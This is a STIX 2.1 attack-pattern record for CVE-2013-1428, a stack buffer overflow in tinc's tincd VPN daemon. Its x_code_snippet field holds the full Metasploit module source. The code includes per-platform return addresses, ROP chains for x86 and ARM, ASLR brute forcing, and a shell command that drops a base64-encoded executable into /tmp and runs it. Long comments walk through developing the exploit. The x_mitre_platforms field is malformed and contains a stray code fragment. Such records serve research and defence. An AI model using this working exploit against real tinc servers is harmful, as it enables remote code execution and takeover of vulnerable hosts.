{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--05129f1b-e3e3-478a-b0ac-8a632c15ae6a",
    "created": "2024-08-14T17:11:56.021731Z",
    "modified": "2024-08-14T17:11:56.021735Z",
    "name": "Tincd Post-Authentication Remote TCP Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Tinc's tincd service. After authentication, a specially crafted tcp packet (default port 655) leads to a buffer overflow and allows to execute arbitrary code. This module has been tested with tinc-1.1pre6 on Windows XP (custom calc payload) and Windows 7 (windows/meterpreter/reverse_tcp), and tinc version 1.0.19 from the ports of FreeBSD 9.1-RELEASE # 0 and various other OS, see targets. The exploit probably works for all versions <= 1.1pre6. A manually compiled version (1.1.pre6) on Ubuntu 12.10 with gcc 4.7.2 seems to be a non-exploitable crash due to calls to __memcpy_chk depending on how tincd was compiled. Bug got fixed in version 1.0.21/1.1pre7. While writing this module it was recommended to the maintainer to start using DEP/ASLR and other protection mechanisms. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/vpn/tincd_bof.rb",
            "external_id": "tincd_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1428"
        },
        {
            "source_name": "reference",
            "url": "http://www.floyd.ch/?p=741"
        },
        {
            "source_name": "reference",
            "url": "http://sitsec.net/blog/2013/04/22/stack-based-buffer-overflow-in-the-vpn-software-tinc-for-authenticated-peers/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'securerandom'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::TincdExploitClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Tincd Post-Authentication Remote TCP Stack Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in Tinc's tincd\n        service. After authentication, a specially crafted tcp packet (default port 655)\n        leads to a buffer overflow and allows to execute arbitrary code. This module has\n        been tested with tinc-1.1pre6 on Windows XP (custom calc payload) and Windows 7\n        (windows/meterpreter/reverse_tcp), and tinc version 1.0.19 from the ports of\n        FreeBSD 9.1-RELEASE # 0 and various other OS, see targets. The exploit probably works\n        for all versions <= 1.1pre6.\n        A manually compiled version (1.1.pre6) on Ubuntu 12.10 with gcc 4.7.2 seems to\n        be a non-exploitable crash due to calls to __memcpy_chk depending on how tincd\n        was compiled. Bug got fixed in version 1.0.21/1.1pre7. While writing this module\n        it was recommended to the maintainer to start using DEP/ASLR and other protection\n        mechanisms.\n      },\n      'Author'         =>\n        [\n            # PoC changes (mostly reliability), port python to ruby, exploitation including ROP, support for all OS, metasploit module\n            'Tobias Ospelt', # @floyd_ch\n            # original finding, python PoC crash\n            'Martin Schobert' # @nitram2342\n        ],\n      'References'     =>\n        [\n          ['CVE', '2013-1428'],\n          ['OSVDB', '92653'],\n          ['BID', '59369'],\n          ['URL', 'http://www.floyd.ch/?p=741'],\n          ['URL', 'http://sitsec.net/blog/2013/04/22/stack-based-buffer-overflow-in-the-vpn-software-tinc-for-authenticated-peers/']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1675,\n          'DisableNops' => true\n        },\n      'Privileged'     => true,\n      'Targets'        =>\n          [\n            # full exploitation x86:\n            ['Windows XP x86, tinc 1.1.pre6 (exe installer)',  { 'Platform' => 'win', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],\n            ['Windows 7 x86, tinc 1.1.pre6 (exe installer)',  { 'Platform' => 'win', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],\n            ['FreeBSD 9.1-RELEASE # 0 x86, tinc 1.0.19 (ports)', { 'Platform' => 'bsd', 'Ret' => 0x0804BABB, 'offset' => 1676 }],\n            ['Fedora 19 x86 ROP (NX), write binary to disk payloads, tinc 1.0.20 (manual compile)', {\n              'Platform' => 'linux', 'Arch' => ARCH_X86, 'Ret' => 0x4d10ee87, 'offset' => 1676 }\n              ],\n            ['Fedora 19 x86 ROP (NX), CMD exec payload, tinc 1.0.20 (manual compile)', {\n              'Platform' => 'unix', 'Arch' => ARCH_CMD, 'Ret' => 0x4d10ee87, 'offset' => 1676 }\n              ],\n            ['Archlinux 2013.04.01 x86, tinc 1.0.20 (manual compile)',  { 'Platform' => 'linux', 'Ret' => 0x08065929, 'offset' => 1676 }],\n            ['OpenSuse 11.2 x86, tinc 1.0.20 (manual compile)',  { 'Platform' => 'linux', 'Ret' => 0x0804b07f, 'offset' => 1676 }],\n            # full exploitation ARM:\n            ['Pidora 18 ARM ROP(NX)/ASLR brute force, write binary to disk payloads, tinc 1.0.20 (manual compile with restarting daemon)',  {\n              'Platform' => 'linux', 'Arch' => ARCH_ARMLE, 'Ret' => 0x00015cb4, 'offset' => 1668 }\n            ],\n            ['Pidora 18 ARM ROP(NX)/ASLR brute force, CMD exec payload, tinc 1.0.20 (manual compile with restarting daemon)',  {\n              'Platform' => 'linux', 'Arch' => ARCH_CMD, 'Ret' => 0x00015cb4, 'offset' => 1668 }\n            ],\n            # crash only:\n            ['Crash only: Ubuntu 12.10 x86, tinc 1.1.pre6 (apt-get or manual compile)',  { 'Platform' => 'linux', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],\n            ['Crash only: Fedora 16 x86, tinc 1.0.19 (yum)',  { 'Platform' => 'linux', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],\n            ['Crash only: OpenSuse 11.2 x86, tinc 1.0.16 (rpm package)',  { 'Platform' => 'linux', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],\n            ['Crash only: Debian 7.3 ARM, tinc 1.0.19 (apt-get)',  { 'Platform' => 'linux', 'Ret' => 0x9000, 'offset' => 1668 }]\n          ],\n      'DisclosureDate' => '2013-04-22', # finding, msf module: Dec 2013\n      'DefaultTarget'  => 0))\n\n    register_options(\n        [ # Only for shellcodes that write binary to disk\n          # Has to be short, usually either . or /tmp works\n          # /tmp could be mounted as noexec\n          # . is usually only working if tincd is running as root\n          OptString.new('BINARY_DROP_LOCATION', [false, 'Short location to drop executable on server, usually /tmp or .', '/tmp']),\n          OptInt.new('BRUTEFORCE_TRIES', [false, 'How many brute force tries (ASLR brute force)', 200]),\n          OptInt.new('WAIT', [false, 'Waiting time for server daemon restart (ASLR brute force)', 3])\n        ], self\n      )\n  end\n\n  def exploit\n    # #\n    # x86\n    # #\n    # WINDOWS XP and 7 full exploitation\n    # Simple, we only need some mona.py magic\n    # C:\\Program Files\\tinc>\"C:\\Program Files\\Immunity Inc\\Immunity Debugger\\ImmunityDebugger.exe\" \"C:\\Program Files\\tinc\\tincd.exe -D -d 5\"\n    # !mona config -set workingfolder c:\\logs\\%p\n    # !mona pc 1682\n    #  --> C:\\logs\\tincd\\pattern\n    # !mona findmsp\n    # Straight forward, when we overwrite EIP the second value\n    # on the stack is pointing to our payload.\n    # !mona findwild -o -type instr -s \"pop r32# ret\"\n\n    # FREEBSD full exploitation\n    # Same offset as windows, same exploitation method\n    # But we needed a new pop r32# ret for the freebsd version\n    # No mona.py help on bsd or linux so:\n    # - Dumped .text part of tincd binary in gdb\n    # - Search in hex editor for opcodes for \"pop r32# ret\":\n    #  58c3, 59c3, ..., 5fc3\n    # - Found a couple of 5dc3. ret = start of .text + offset in hex editor\n    # - 0x0804BABB works very well\n\n    # UBUNTU crash only\n    # Manually compiled version (1.1.pre6) on Ubuntu 12.10 with gcc 4.7.2 seems to be a non-exploitable crash, because\n    # the bug is in a fixed size (MAXSIZE) struct member variable. The size of the destination is known\n    # at compile time. gcc is introducing a call to __memcpy_chk:\n    # http://gcc.gnu.org/svn/gcc/branches/cilkplus/libssp/memcpy-chk.c\n    # memcpy_chk does a __chk_fail call if the destination buffer is smaller than the source buffer. Therefore it will print\n    # *** buffer overflow detected *** and terminate (SIGABRT). The same result for tincd 10.0.19 which can be installed\n    # from the repository. It might be exploitable for versions compiled with an older version of gcc.\n    # memcpy_chk seems to be in gcc since 2005:\n    # http://gcc.gnu.org/svn/gcc/branches/cilkplus/libssp/memcpy-chk.c\n    # http://gcc.gnu.org/git/?p=gcc.git;a=history;f=libssp/memcpy-chk.c;hb=92920cc62318e5e8b6d02d506eaf66c160796088\n\n    # OPENSUSE\n    # OpenSuse 11.2\n    # Installation as described on the tincd website. For 11.2 there are two versions.\n    # Decided for 1.0.16 as this is a vulnerable version\n    # wget \"http://download.opensuse.org/repositories/home:/seilerphilipp/SLE_11_SP2/i586/tinc-1.0.16-3.1.i586.rpm\"\n    # rpm -i tinc-1.0.16-3.1.i586.rpm\n    # Again, strace shows us that the buffer overflow was detected (see Ubuntu)\n    # writev(2, [{\"*** \", 4}, {\"buffer overflow detected\", 24}, {\" ***: \", 6}, {\"tincd\", 5}, {\" terminated\\n\", 12}], 5) = 51\n    # So a crash-only non-exploitable bof here. So let's go for manual install:\n    # wget 'http://www.tinc-vpn.org/packages/tinc-1.0.20.tar.gz'\n    # yast -i gcc zlib zlib-devel && echo \"yast is still ugly\" && zypper install lzo-devel libopenssl-devel make && make && make install\n    # Exploitable. Let's see:\n    # tincd is mapped at 0x8048000. There is a 5d3c at offset 307f in the tincd binary. this means:\n    # the offset to pop ebp; ret is 0x0804b07f\n\n    # FEDORA\n    # Fedora 16\n    # yum has version 1.0.19\n    # yum install tinc\n    # Non-exploitable crash, see Ubuntu. Strace tells us:\n    # writev(2, [{\"*** \", 4}, {\"buffer overflow detected\", 24}, {\" ***: \", 6}, {\"tincd\", 5}, {\" terminated\\n\", 12}], 5) = 51\n    # About yum: Fedora 17 has fixed version 1.0.21, Fedora 19 fixed version 1.0.23\n    # Manual compile went on with Fedora 19\n    # wget 'http://www.tinc-vpn.org/packages/tinc-1.0.20.tar.gz'\n    # yum install gcc zlib-devel.i686 lzo-devel.i686 openssl-devel.i686 && ./configure && make && make install\n    # Don't forget to stop firewalld for testing, as the port is still closed otherwise\n    # # hardening-check tincd\n    # tincd:\n    #  Position Independent Executable: no, normal executable!\n    #  Stack protected: no, not found!\n    #  Fortify Source functions: no, only unprotected functions found!\n    #  Read-only relocations: yes\n    #  Immediate binding: no, not found!\n    # Running this module with target set to Windows:\n    # Program received signal SIGSEGV, Segmentation fault.\n    # 0x0041caa6 in ?? ()\n    # well and that's our windows offset...\n    # (gdb) info proc mappings\n    # 0x8048000  0x8068000    0x20000        0x0 /usr/local/sbin/tincd\n    # After finding a normal 5DC3 (pop ebp# ret) at offset 69c3 of the binary we\n    # can try to execute the payload on the stack, but:\n    # (gdb) stepi\n    # Program received signal SIGSEGV, Segmentation fault.\n    # 0x08e8ee08 in ?? ()\n    # Digging deeper we find:\n    # dmesg | grep protection\n    # [    0.000000] NX (Execute Disable) protection: active\n    # or:\n    # # objdump -x /usr/local/sbin/tincd\n    # [...] STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**4\n    #       filesz 0x00000000 memsz 0x00000000 flags rw-\n    # or: https://bugzilla.redhat.com/show_bug.cgi?id=996365\n    # Time for ROP\n    # To start the ROP we need a POP r32# POP ESP# RET (using the first four bytes of the shellcode\n    # as a pointer to instructions). Was lucky after some searching:\n    # (gdb) x/10i 0x4d10ee87\n    #    0x4d10ee87:  pop    %ebx\n    #    0x4d10ee88:  mov    $0xf5d299dd,%eax\n    #    0x4d10ee8d:  rcr    %cl,%al\n    #    0x4d10ee8f:  pop    %esp\n    #    0x4d10ee90:  ret\n\n    # ARCHLINUX\n    # archlinux-2013.04.01 pacman has fixed version 1.0.23, so went for manual compile:\n    # wget 'http://www.tinc-vpn.org/packages/tinc-1.0.20.tar.gz'\n    # pacman -S gcc zlib lzo openssl make && ./configure && make && make install\n    # Offset in binary to 58c3: 0x1D929 + tincd is mapped at starting address 0x8048000\n    # -->Ret: 0x8065929\n    # No NX protection, it simply runs the shellcode :)\n\n    # #\n    # ARM\n    # #\n    # ARM Pidora 18 (Raspberry Pi Fedora Remix) on a physical Raspberry Pi\n    # Although this is more for the interested reader, as Pidora development\n    # already stopped... Raspberry Pi's are ARM1176JZF-S (700 MHz) CPUs\n    # meaning it's an ARMv6 architecture\n    # yum has fixed version 1.0.21, so went for manual compile:\n    # wget 'http://www.tinc-vpn.org/packages/tinc-1.0.20.tar.gz'\n    # yum install gdb gcc zlib-devel lzo-devel openssl-devel && ./configure && make && make install\n    # Is the binary protected?\n    # wget \"http://www.trapkit.de/tools/checksec.sh\" && chmod +x checksec.sh\n    # # ./checksec.sh --file /usr/local/sbin/tincd\n    # RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE\n    # No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /usr/local/sbin/tincd\n    # so again NX... but what about the system things?\n    #  cat /proc/sys/kernel/randomize_va_space\n    # 2\n    # --> \"Randomize the positions of the stack, VDSO page, shared memory regions, and the data segment.\n    #      This is the default setting.\"\n    # Here some examples of the address of the system function:\n    # 0xb6c40848\n    # 0xb6cdd848\n    # 0xb6c7c848\n    # Looks like we would have to brute force one byte\n    # (gdb) info proc mappings\n    #  0x8000    0x23000    0x1b000          0         /usr/local/sbin/tincd\n    # 0x2b000    0x2c000     0x1000    0x1b000         /usr/local/sbin/tincd\n    # When we exploit we get the following:\n    # Program received signal SIGSEGV, Segmentation fault.\n    # 0x90909090 in ?? ()\n    # ok, finally a different offset to eip. Let's figure it out:\n    # $ tools/pattern_create.rb 1676\n    # Ok, pretty close, it's 1668. If we randomly choose ret as 0x9000 we get:\n    # (gdb) break *0x9000\n    # Breakpoint 1 at 0x9000\n    # See that our shellcode is *on* the stack:\n    # (gdb) x/10x $sp\n    # 0xbee14308: 0x00000698 0x00000000 0x00000000 0x00000698\n    # 0xbee14318: 0x31203731 0x0a323736 0xe3a00002 0xe3a01001 <-- 0xe3a00002 is the start of our shellcode\n    # 0xbee14328: 0xe3a02006 0xe3a07001\n    # let's explore the code we can reuse:\n    # (gdb) info functions\n    # objdump -d /usr/local/sbin/tincd >assembly.txt\n    # while simply searching for the bx instruction we were not very lucky,\n    # but searching for some \"pop pc\" it's easy to find nice gadgets.\n    # we can write arguments to the .data section again:\n    # 0x2b3f0->0x2b4ac at 0x0001b3f0: .data ALLOC LOAD DATA HAS_CONTENTS\n    # The problem is we can not reliably forecast the system function's address, but it's\n    # only one byte random, therefore we have to brute force it and/or find a memory leak.\n    # Let's assume it's a restarting daemon:\n    # create /etc/systemd/system/tincd.service and fill in Restart=restart-always\n\n    # ARM Debian Wheezy on qemu\n    # root@debian:~# apt-cache showpkg tinc\n    # Package: tinc\n    # Versions:\n    # 1.0.19-3 (/var/lib/apt/lists/ftp.halifax.rwth-aachen.de_debian_dists_wheezy_main_binary-armhf_Packages)\n    # nice, that's vulnerable\n    # apt-get install tinc\n    # apt-get install elfutils && ln -s /usr/bin/eu-readelf /usr/bin/readelf\n    # wget \"http://www.trapkit.de/tools/checksec.sh\" && chmod +x checksec.sh\n    # # ./checksec.sh --file /usr/sbin/tincd\n    # RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE\n    # Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /usr/sbin/tincd\n    # Puh, doesn't look too good for us, NX enabled, Stack canary present and a partial RELRO, I'm not going to cover this one here\n\n    packet_payload = payload.encoded\n    # Pidora and Fedora/ROP specific things\n    if target.name =~ /Pidora 18/ || target.name =~ /Fedora 19/\n      rop_generator = nil\n      filename = rand_text_alpha(1)\n      cd = \"cd #{datastore['BINARY_DROP_LOCATION']};\"\n      cd = '' if datastore['BINARY_DROP_LOCATION'] == '.'\n\n      if target.name =~ /Pidora 18/\n        print_status('Using ROP and brute force ASLR guesses to defeat NX/ASLR on ARMv6 based Pidora 18')\n        print_status('This requires a restarting tincd daemon!')\n        print_status('Warning: This is likely to get tincd into a state where it doesn\\'t accept connections anymore')\n        rop_generator = method(:create_pidora_rop)\n      elsif target.name =~ /Fedora 19/\n        print_status('Using ROP to defeat NX on Fedora 19')\n        rop_generator = method(:create_fedora_rop)\n      end\n\n      if target.arch.include? ARCH_CMD\n        # The CMD payloads are a bit tricky on Fedora. As of december 2013\n        # some of the generic unix payloads (e.g. reverse shell with awk) don't work\n        # (even when executed directly in a terminal on Fedora)\n        # use generic/custom and specify PAYLOADSTR without single quotes\n        # it's usually sh -c *bla*\n        packet_payload = create_fedora_rop(payload.encoded.split(' ', 3))\n      else\n        # the binary drop payloads\n        packet_payload = get_cmd_binary_drop_payload(filename, cd, rop_generator)\n        if packet_payload.length > target['offset']\n          print_status(\"Plain version too big (#{packet_payload.length}, max. #{target['offset']}), trying zipped version\")\n          packet_payload = get_gzip_cmd_binary_drop_payload(filename, cd, rop_generator)\n          vprint_status(\"Achieved version with #{packet_payload.length} bytes\")\n        end\n      end\n    end\n\n    if packet_payload.length > target['offset']\n      fail_with(Failure::BadConfig, \"The resulting payload has #{packet_payload.length} bytes, we only have #{target['offset']} space.\")\n    end\n    injection = packet_payload + rand_text_alpha(target['offset'] - packet_payload.length) + [target.ret].pack('V')\n\n    vprint_status(\"Injection starts with #{injection.unpack('H*')[0][0..30]}...\")\n\n    if target.name =~ /Pidora 18/\n      # we have to brute force to defeat ASLR\n      datastore['BRUTEFORCE_TRIES'].times do\n        print_status(\"Try #{n}: Initializing tinc exploit client (setting up ciphers)\")\n        setup_ciphers\n        print_status('Telling tinc exploit client to connect, handshake and send the payload')\n        begin\n          send_recv(injection)\n        rescue RuntimeError, Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, ::Timeout::Error, ::EOFError => runtime_error\n          print_error(runtime_error.message)\n          print_error(runtime_error.backtrace.join(\"\\n\\t\"))\n        rescue Rex::ConnectionRefused\n          print_error('Server refused connection. Is this really a restarting daemon? Try higher WAIT option.')\n          sleep(3)\n          next\n        end\n        secs = datastore['WAIT']\n        print_status(\"Waiting #{secs} seconds for server to restart daemon (which will change the ASLR byte)\")\n        sleep(secs)\n      end\n      print_status(\"Brute force with #{datastore['BRUTEFORCE_TRIES']} tries done. If not successful you could try again.\")\n    else\n      # Setup local ciphers\n      print_status('Initializing tinc exploit client (setting up ciphers)')\n      setup_ciphers\n      # The tincdExploitClient will do the crypto handshake with the server and\n      # send the injection (a packet), where the actual buffer overflow is triggered\n      print_status('Telling tinc exploit client to connect, handshake and send the payload')\n      send_recv(injection)\n    end\n    print_status('Exploit finished')\n  end\n\n  def get_cmd_binary_drop_payload(filename, cd, rop_generator)\n    elf_base64 = Rex::Text.encode_base64(generate_payload_exe)\n    cmd = ['/bin/sh', '-c', \"#{cd}echo #{elf_base64}|base64 -d>#{filename};chmod +x #{filename};./#{filename}\"]\n    vprint_status(\"You will try to execute #{cmd.join(' ')}\")\n    rop_generator.call(cmd)\n  end\n\n  def get_gzip_cmd_binary_drop_payload(filename, cd, rop_generator)\n    elf_zipped_base64 = Rex::Text.encode_base64(Rex::Text.gzip(generate_payload_exe))\n    cmd = ['/bin/sh', '-c', \"#{cd}echo #{elf_zipped_base64}|base64 -d|gunzip>#{filename};chmod +x #{filename};./#{filename}\"]\n    vprint_status(\"You will try to execute #{cmd.join(' ')}\")\n    rop_generator.call(cmd)\n  end\n\n  def create_pidora_rop(sys_execv_args)\n    sys_execv_args = sys_execv_args.join(' ')\n    sys_execv_args += \"\\x00\"\n\n    aslr_byte_guess = SecureRandom.random_bytes(1).ord\n    print_status(\"Using 0x#{aslr_byte_guess.to_s(16)} as random byte for ASLR brute force (hope the server will use the same at one point)\")\n\n    # Gadgets tincd\n    # c714:\te1a00004 \tmov\tr0, r4\n    # c718:\te8bd8010 \tpop\t{r4, pc}\n    mov_r0_r4_pop_r4_ret = [0x0000c714].pack('V')\n    pop_r4_ret = [0x0000c718].pack('V')\n    # 1cef4:\te580400c \tstr\tr4, [r0, #12]\n    # 1cef8:\te8bd8010 \tpop\t{r4, pc}\n    # mov_r0_plus_12_to_r4_pop_r4_ret = [0x0001cef4].pack('V')\n\n    # bba0:\te5843000 \tstr\tr3, [r4]\n    # bba4:\te8bd8010 \tpop\t{r4, pc}\n    mov_to_r4_addr_pop_r4_ret = [0x0000bba0].pack('V')\n\n    # 13ccc:\te1a00003 \tmov\tr0, r3\n    # 13cd0:\te8bd8008 \tpop\t{r3, pc}\n    pop_r3_ret = [0x00013cd0].pack('V')\n\n    # address to start rop (removing 6 addresses of garbage from stack)\n    # 15cb4:\te8bd85f0 \tpop\t{r4, r5, r6, r7, r8, sl, pc}\n    # start_rop = [0x00015cb4].pack('V')\n    # see target Ret\n\n    # system function address base to brute force\n    # roughly 500 tests showed addresses between\n    # 0xb6c18848 and 0xb6d17848 (0xff distance)\n    system_addr = [0xb6c18848 + (aslr_byte_guess * 0x1000)].pack('V')\n\n    # pointer into .data section\n    loc_dot_data = 0x0002b3f0 # a location inside .data\n\n    # Rop into system(), prepare address of payload in r0\n    rop = ''\n\n    # first, let's put the payload into the .data section\n\n    # Put the first location to write to in r4\n    rop += pop_r4_ret\n\n    sys_execv_args.scan(/.{1,4}/).each_with_index do |argument_part, i|\n      # Give location inside .data via stack\n      rop += [loc_dot_data + i * 4].pack('V')\n      # Pop 4 bytes of the command into r3\n      rop += pop_r3_ret\n      # Give 4 bytes of command on stack\n      if argument_part.length == 4\n        rop += argument_part\n      else\n        rop += argument_part + rand_text_alpha(4 - argument_part.length)\n      end\n      # Write the 4 bytes to the writable location\n      rop += mov_to_r4_addr_pop_r4_ret\n    end\n\n    # put the address of the payload into r4\n    rop += [loc_dot_data].pack('V')\n\n    # now move r4 to r0\n    rop += mov_r0_r4_pop_r4_ret\n    rop += rand_text_alpha(4)\n    # we don't care what ends up in r4 now\n\n    # call system\n    rop += system_addr\n  end\n\n  def create_fedora_rop(sys_execv_args)\n    # Gadgets tincd\n    loc_dot_data = 0x80692e0 # a location inside .data\n    pop_eax = [0x8065969].pack('V') # pop eax; ret\n    pop_ebx = [0x8049d8d].pack('V') # pop ebx; ret\n    pop_ecx = [0x804e113].pack('V') # pop ecx; ret\n    xor_eax_eax = [0x804cd60].pack('V') # xor eax eax; ret\n    # <ATTENTION> This one destroys ebx:\n    mov_to_eax_addr = [0x805f2c2].pack('V') + rand_text_alpha(4) # mov [eax] ecx ; pop ebx ; ret\n    # </ATTENTION>\n\n    # Gadgets libcrypto.so.10 libcrypto.so.1.0.1e\n    xchg_ecx_eax = [0x4d170d1f].pack('V') # xchg ecx,eax; ret\n    # xchg_edx_eax = [0x4d25afa3].pack('V') # xchg edx,eax ; ret\n    # inc_eax = [0x4d119ebc].pack('V') # inc eax ; ret\n\n    # Gadgets libc.so.6 libc-2.17.so\n    pop_edx = [0x4b5d7aaa].pack('V') # pop edx; ret\n    int_80 = [0x4b6049c5].pack('V') # int 0x80\n\n    # Linux kernel system call 11: sys_execve\n    # ROP\n    rop = ''\n\n    index = 0\n    stored_argument_pointer_offsets = []\n\n    sys_execv_args.each_with_index do |argument, argument_no|\n      stored_argument_pointer_offsets << index\n      argument.scan(/.{1,4}/).each_with_index do |argument_part, i|\n        # Put location to write to in eax\n        rop += pop_eax\n        # Give location inside .data via stack\n        rop += [loc_dot_data + index + i * 4].pack('V')\n        # Pop 4 bytes of the command into ecx\n        rop += pop_ecx\n        # Give 4 bytes of command on stack\n        if argument_part.length == 4\n          rop += argument_part\n        else\n          rop += argument_part + rand_text_alpha(4 - argument_part.length)\n        end\n        # Write the 4 bytes to the writable location\n        rop += mov_to_eax_addr\n      end\n      # We have to end the argument with a zero byte\n      index += argument.length\n      # We don't have \"xor ecx, ecx\", but we have it for eax...\n      rop += xor_eax_eax\n      rop += xchg_ecx_eax\n      # Put location to write to in eax\n      rop += pop_eax\n      # Give location inside .data via stack\n      rop += [loc_dot_data + index].pack('V')\n      # Write the zeros\n      rop += mov_to_eax_addr\n      index += 1 # where we can write the next argument\n    end\n\n    # Append address of the start of each argument\n    stored_argument_pointer_offsets.each do |offset|\n      rop += pop_eax\n      rop += [loc_dot_data + index].pack('V')\n      rop += pop_ecx\n      rop += [loc_dot_data + offset].pack('V')\n      rop += mov_to_eax_addr\n      index += 4\n    end\n    # end with zero\n    rop += xor_eax_eax\n    rop += xchg_ecx_eax\n\n    rop += pop_eax\n    rop += [loc_dot_data + index].pack('V')\n    rop += mov_to_eax_addr\n\n    rop += pop_ebx\n    rop += [loc_dot_data].pack('V')\n\n    rop += pop_ecx\n    rop += [loc_dot_data + sys_execv_args.join(' ').length + 1].pack('V')\n\n    rop += pop_edx\n    rop += [loc_dot_data + index].pack('V')\n\n    # sys call 11 = sys_execve\n    rop += pop_eax\n    rop += [0x0000000b].pack('V')\n\n    rop += int_80\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-04-22, # finding, msf module: Dec 2013",
    "x_mitre_platforms": [
        "linux', 'Arch' => ARCH_CMD, 'Ret' => 0x00015cb4, 'offset' => 1668 }"
    ]
}